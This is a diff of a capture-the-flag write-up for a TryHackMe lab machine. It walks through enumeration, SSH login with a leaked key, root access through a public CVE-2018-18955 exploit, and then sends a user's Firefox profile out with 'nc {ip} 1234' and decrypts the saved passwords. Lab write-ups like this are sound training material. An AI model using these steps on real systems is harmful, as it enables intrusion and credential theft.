@@ -1,4 +1,4 @@
-Hi, here is how to successfully complete the machine https://tryhackme.com/r/room/thelondonbridge
+Hi, here is how to successfully complete the machine [The london bridge](https://tryhackme.com/r/room/thelondonbridge)
 
 I start by checking if the machine is available by doing a ping -c 1
 <pre><code>> ping -c 1 10.10.3.253
@@ -52,9 +52,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds</code></pre>
 
-
+if we go to http://{ip}:8080/ we will see the page
 ![2024-10-03_11-28](https://github.com/user-attachments/assets/1e5abef6-fd72-46c9-af2a-cb5c5d6b4e82)
 
+I decided to search directories with gobuster.
 <pre><code>> gobuster dir -u http://10.10.3.253:8080/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 | tee gobuster.txt
 ===============================================================
 Gobuster v3.6
@@ -74,19 +75,22 @@ Starting gobuster in directory enumeration mode
 /feedback             (Status: 405) [Size: 178]
 /gallery              (Status: 200) [Size: 1722]
 /upload               (Status: 405) [Size: 178]
-/dejaview             (Status: 200) [Size: 823]</code></pre>
+/dejaview             (Status: 200) [Size: 823]
+</code></pre>
 
+if we go to /dejaview we will find this
 ![2024-10-03_12-05](https://github.com/user-attachments/assets/4e0164e9-c7cf-477f-a135-f65246ab4032)
 
+if we use burp suite to see what is sent when we click on view image we will find this
 
 ![2024-10-03_13-43](https://github.com/user-attachments/assets/0d3f160f-abb8-41ba-8095-dd27620b40d7)
 
 ![2024-10-03_13-45](https://github.com/user-attachments/assets/8e032f11-a555-4c33-8e08-0af46e4fcb38)
 
-
+we connect via ssh using the id_rsa we got previously in the SSRF
 <pre><code>> chmod 600 id_rsa
 > ssh -i id_rsa beth@10.10.3.253
-^C⏎                                                                                                                 maxi@maxi-notebook ~/C/T/t/content [SIGINT]> ssh -i id_rsa beth@10.10.52.222
+> ssh -i id_rsa beth@10.10.52.222
 The authenticity of host '10.10.52.222 (10.10.52.222)' can't be established.
 ED25519 key fingerprint is SHA256:ytPniu9JUHpepgFs9WjrDo4KrlD74N5VR4L5MCCx3D8.
 This key is not known by any other names.
@@ -106,18 +110,20 @@ Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
 beth@london:~$ 
 </code></pre>
 
+and using find we look for the file user.txt, which contains the user flag
 <pre><code>beth@london:/home$ find / -type f -name 'user.txt' 2>/dev/null                                                      
 /home/beth/__pycache__/user.txt</code></pre>
 
+
+we can see that this machine is using an outdated version of the kernel, which is vulnerable to CVE-2018-18955, is a privilege escalation vulnerability found in Linux systems using the XFS file system. Basically, it lets someone on the system get root access due to a race condition issue during mounting and unmounting. This means it’s a problem that happens when two processes try to access or change shared data at the same time, creating an opening to gain root privileges.
+
+A  [proof-of-concept (PoC)](https://github.com/scheatkode/CVE-2018-18955) script for this vulnerability has been made available on GitHub. The script can be compiled and run to exploit the exploit and gain shell root access
+
+we need to download and send to the target machine the next filesexploit.dbus.sh,php-reverse-shell.phpm rootshell.c, subshell.c and subuid_shell.c
 <pre><code>beth@london:~/__pycache__$ uname -a
 Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
 
-https://github.com/scheatkode/CVE-2018-18955
-exploit.dbus.sh
-php-reverse-shell.php
-rootshell.c
-subshell.c
-subuid_shell.c
+once done, run the script and you should have root privileges
 <pre><code>beth@london:~$ bash exploit.dbus.sh 
 [*] Compiling...
 [*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
@@ -146,6 +152,7 @@ Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible caus
 [*] Launching root shell: /tmp/sh
 root@london:~# </code></pre>
 
+the root flag
 <pre><code>root@london:/root# ls -la
 total 52
 drwx------  6 root root 4096 Apr 23 22:10 .
@@ -165,15 +172,19 @@ drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
 root@london:/root# cat .root.txt
 THM{???}</code></pre>
 
-<pre><code>root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox </code></pre>
+to get the charles password we have to look in “/home/charles” directory “/.mozilla”.
 
+we are going to compress it to send it to our machine
+<pre><code>root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox </code></pre>
 
 <pre><code>nc {ip} 1234 < /tmp/firefox.tar.gz</code></pre>
 
+we decompress it
 <pre><code>~> tar -xvzf firefox.tar.gz</code></pre>
 
 <pre><code>sudo chmod -R 777 firefox</code></pre>
 
+We can use the tool [firefox_decrypt](https://github.com/unode/firefox_decrypt/tree/main) to get Charles's saved passwords from Firefox
 <pre><code>python3 firefox_decrypt.py firefox/8k3bf3zp.charles/
 2024-10-03 16:27:03,316 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles/
 2024-10-03 16:27:03,318 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles/' is a profile location
